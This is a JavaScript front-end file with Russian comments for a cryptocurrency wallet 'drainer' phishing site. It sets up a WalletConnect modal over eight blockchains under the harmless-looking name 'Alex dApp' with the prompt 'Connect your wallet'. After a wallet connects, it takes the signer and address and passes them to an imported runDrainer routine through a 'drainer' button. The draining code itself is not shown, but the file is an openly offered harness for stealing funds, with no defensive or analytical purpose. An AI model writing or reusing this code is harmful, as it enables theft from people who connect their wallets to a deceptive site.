import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// Все сети, которые ты хочешь поддерживать
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

// Адаптер для Wagmi (WalletConnect и встроенные кошельки)
const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

// Информация для WalletConnect/Trust Wallet
const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

// Создаём AppKit модалку
const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// Ссылки на элементы
const connectBtn = document.getElementById('connect-btn')
const drainerBtn = document.getElementById('drainer-btn')
const status     = document.getElementById('status')

// Разблокировать кнопку drainer на всякий случай
drainerBtn.disabled = false

let provider = null
let signer   = null
let address  = null

// Кнопка подключения
connectBtn.addEventListener('click', () => {
  modal.open()
})

// После подключения кошелька
modal.on('connect', async () => {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    signer   = provider.getSigner()
    address  = await signer.getAddress()

    status.textContent = `✅ Подключено: ${address}`
    drainerBtn.disabled = false
  } catch (err) {
    console.error('Ошибка подключения:', err)
    status.textContent = `❌ Ошибка подключения`
  }
})

// Запуск drainer
drainerBtn.addEventListener('click', async () => {
  if (!signer || !address) {
    status.textContent = '❗ Сначала подключите кошелёк'
    return
  }

  drainerBtn.disabled = true
  status.textContent = '💥 Запуск Drainer...'

  try {
    await runDrainer(provider, signer, address)
    status.textContent = '✅ Drainer завершён'
  } catch (err) {
    console.error('Ошибка в Drainer:', err)
    status.textContent = `❌ Ошибка: ${err.message}`
  } finally {
    drainerBtn.disabled = false
  }
})
